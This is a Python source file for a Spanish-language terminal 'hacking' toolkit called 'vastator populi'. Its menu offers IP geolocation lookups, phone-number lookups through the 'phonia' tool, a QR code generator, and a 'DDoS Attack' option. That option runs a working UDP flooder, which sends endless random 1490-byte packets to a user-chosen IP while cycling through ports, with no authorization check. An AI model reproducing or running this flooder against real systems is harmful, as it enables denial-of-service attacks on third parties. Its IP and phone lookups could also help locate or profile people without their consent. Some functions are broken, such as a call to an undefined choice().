import pygame
import string
import os
import sys
import time
import socket
import random
import pyfiglet
import requests
import subprocess
import qrcode
from bs4 import BeautifulSoup
from PIL import Image
from colorama import init, Fore
from datetime import datetime
from phonia import * 

# Inicializar Colorama
init()

# Obtener la fecha y hora actual al inicio del programa
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

music_file = os.path.join(os.path.dirname(__file__), 'Song/song.mp3')
# Inicializar pygame
pygame.init()

# Configurar el mezclador de audio
pygame.mixer.init()

# Cargar archivo de música
pygame.mixer.music.load(music_file)

# Reproducir música en bucle
pygame.mixer.music.play(-1)

# Obtener información de una dirección IP
def get_ip_info(ip):
    info = {}
    
    # Obtener información de ip-api.com
    url = f"http://ip-api.com/json/{ip}"
    response = requests.get(url)
    data = response.json()
    
    if data["status"] == "success":
        info["country"] = data["country"]
        info["region"] = data["regionName"]
        info["city"] = data["city"]
        info["isp"] = data["isp"]
    else:
        print("No se pudo obtener información de ip-api.com")
    
    # Obtener información de ipinfo.io
    url = f"http://ipinfo.io/{ip}"
    response = requests.get(url)
    data = response.json()
    
    if "hostname" in data:
        info["hostname"] = data["hostname"]
    else:
        info["hostname"] = "No disponible"
    
    info["org"] = data.get("org", "No disponible")
    info["postal"] = data.get("postal", "No disponible")
    
    # Obtener información de ipgeolocation.io
    url = f"https://ipgeolocation.io/ip-location/{ip}"
    response = requests.get(url)
    soup = BeautifulSoup(response.content, "html.parser")
    
    if soup.find("h1", class_="ip_title") is not None:
        info["latitude"] = soup.find("input", id="latitude")["value"]
        info["longitude"] = soup.find("input", id="longitude")["value"]
        info["asn"] = soup.find("div", class_="bg-info").text.strip()
    
    return info

# Función para solicitar otra dirección IP
def prompt_another_ip():
    print(Fore.MAGENTA + "¿Desea generar información para otra dirección IP? (s/n)" + Fore.RESET)
    choice = input("> ")
    return choice.lower() == "s"

# Función para solicitar otro número de teléfono
def prompt_another_number():
    print(Fore.MAGENTA + "¿Desea generar información para otro número de telefóno?")
    choice()
    return choice.lower() == "s"
# Función para limpiar la terminal
def clear_terminal():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

# Función para imprimir el título en ASCII
def print_ascii_title(title):
    ascii_title = pyfiglet.figlet_format(title)
    print(Fore.CYAN + ascii_title + Fore.RESET)

# Función 2 para imprimir el título en ASCII
def print_ascii_title2(title):
    ascii_title2 = pyfiglet.figlet_format(title)
    print(Fore.BLUE + ascii_title2 + Fore.RESET)

# Creditos
def Creditos():
    print()
    print(Fore.BLUE + "Author   : Evil Bryan Hernandez" + Fore.RESET)
    print(Fore.BLUE + "TikTok   : https://www.tiktok.com/@seguidores_del_temach" + Fore.RESET)
    print(Fore.BLUE + "GitHub   : https://github.com/EvilZyBH" + Fore.RESET)
    print()
    print(Fore.BLUE + f"Fecha y Hora Actual: {day}/{month}/{year} {hour}:{minute}" + Fore.RESET)
    print()

# Función para manejar la opción 1 (CyberSleuth)
def handle_cybersleuth():
    clear_terminal()
    print_ascii_title("CyberSleuth")

    while True:
        print(Fore.MAGENTA + "Ingrese la dirección IP:" + Fore.RESET)
        ip_address = input("> ")

        ip_info = get_ip_info(ip_address)

        print("\nInformación de la IP:")
        print(f"IP: {Fore.GREEN + ip_address + Fore.RESET}")
        print(f"País: {Fore.GREEN + ip_info.get('country', 'No disponible') + Fore.RESET}")
        print(f"Región: {Fore.GREEN + ip_info.get('region', 'No disponible') + Fore.RESET}")
        print(f"Ciudad: {Fore.GREEN + ip_info.get('city', 'No disponible') + Fore.RESET}")
        print(f"ISP: {Fore.GREEN + ip_info.get('isp', 'No disponible') + Fore.RESET}")
        print(f"Hostname: {Fore.GREEN + ip_info.get('hostname', 'No disponible') + Fore.RESET}")
        print(f"Organización: {Fore.GREEN + ip_info.get('org', 'No disponible') + Fore.RESET}")
        print(f"Código postal: {Fore.GREEN + ip_info.get('postal', 'No disponible') + Fore.RESET}")
        print(f"Latitud: {Fore.GREEN + ip_info.get('latitude', 'No disponible') + Fore.RESET}")
        print(f"Longitud: {Fore.GREEN + ip_info.get('longitude', 'No disponible') + Fore.RESET}")
        print(f"ASN: {Fore.GREEN + ip_info.get('asn', 'No disponible') + Fore.RESET}")

        if not prompt_another_ip():
            print_ascii_title("¡Hasta luego!")
            break

        clear_terminal()
        print_ascii_title("CyberSleuth")

# Función para manejar la opción 2 (Phonia)
def handle_phonia():
    while True:
        clear_terminal()
        print_ascii_title("Phonia")
        print(Fore.MAGENTA + "Ingrese el número telefónico sin sçimbolos (ejemplo: 5210000000000)" +Fore.RESET)
        phone_number = input("> ")
        subprocess.run(['./phonia/phonia', '-p', phone_number])

        # Preguntar si desea ingresar otro número de teléfono
        print(Fore.MAGENTA + "¿Desea ingresar otro número de teléfono? (s/n)" + Fore.RESET)
        choice = input("> ")
        if choice.lower() != "s":
            break

# Función para manejar la opción 3 (QRLink)
def handle_qrlink():
    while True:
        clear_terminal()
        print_ascii_title("QRLink")

        # Solicita al usuario un enlace
        enlace = input(Fore.MAGENTA + "Introduce el enlace que deseas convertir a QR: " + Fore.RESET)

        # Nombre del archivo de la imagen QR
        nombre_archivo = "codigo_qr.png"

        # Genera el código QR y lo guarda como imagen
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(enlace)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        img.save(nombre_archivo)

        # Muestra el código QR en la terminal utilizando feh (Linux)
        if os.name != 'nt':  # Verifica si el sistema no es Windows
            os.system(f'feh {nombre_archivo}')  # Utiliza feh en sistemas Linux
        else:
            print(Fore.YELLOW + "La visualización de imágenes en la terminal no es compatible en este sistema." + Fore.RESET)

        # Pregunta al usuario si desea generar otro código QR
        print(Fore.MAGENTA + "¿Desea generar otro código QR? (s/n)" + Fore.RESET)
        choice = input("> ")
        if choice.lower() != "s":
            break  # Sale del bucle while y regresa al menú principal

# Función para manejar la opción 4 (DDoS Attack)
def handle_ddosattack():
    ##############
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    #############

    clear_terminal()
    print_ascii_title2("DDoS Attack")
    ip = input(Fore.MAGENTA + "IP Target > " + Fore.RESET)
    port = int(input(Fore.MAGENTA + "Port      > " + Fore.RESET))

    clear_terminal()
    print_ascii_title2("Iniciando Ataque")
    print(Fore.RED + "[                    ] 0% " + Fore.RESET)
    time.sleep(5)
    clear_terminal()
    print_ascii_title2("Iniciando Ataque")
    print(Fore.RED + "[=====               ] 25%" + Fore.RESET)
    time.sleep(5)
    clear_terminal()
    print_ascii_title2("Iniciando Ataque")
    print(Fore.YELLOW + "[==========          ] 50%" + Fore.RESET)
    time.sleep(5)
    clear_terminal()
    print_ascii_title2("Iniciando Ataque")
    print(Fore.YELLOW + "[===============     ] 75%" + Fore.RESET)
    time.sleep(5)
    clear_terminal()
    print_ascii_title2("Iniciando Ataque")
    print(Fore.GREEN + "[====================] 100%" + Fore.RESET)
    time.sleep(3)
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        print("Envió %s paquete a %s a través del puerto:%s" % (sent, ip, port))
        if port == 65534:
            port = 1


# Limpiar la terminal y mostrar el título
clear_terminal()
print_ascii_title("vastator populi")
Creditos()

while True:
    print(Fore.GREEN + "Opciones:")
    print("1. " + Fore.GREEN + "CyberSleuth (Sacar información de una IP)")
    print("2. phonia (Sacar información de un número de teléfono)")
    print("3. QRLink (Convertir un enlace a QR)")
    print("4. DDoS Attack")
    print("0. Salir" + Fore.RESET)

    print(Fore.CYAN + "Seleccione una opción:" + Fore.RESET)
    option = input("> ")

    clear_terminal()

    if option == "1":
        handle_cybersleuth()
    elif option == "2":
        phone_number = handle_phonia()
    elif option == "3":
        handle_qrlink()
    elif option == "4":
        print_ascii_title("DDoS Attack")
        handle_ddosattack()
    elif option == "0":
        print_ascii_title("¡Hasta luego!")
        break
    else:
        print("Opción no válida. Por favor, seleccione una opción válida.")

    input("\nPresione Enter para continuar...")
    clear_terminal()
    print_ascii_title("vastator populi")
    Creditos()

# Detener la música al finalizar el programa
pygame.mixer.music.stop()

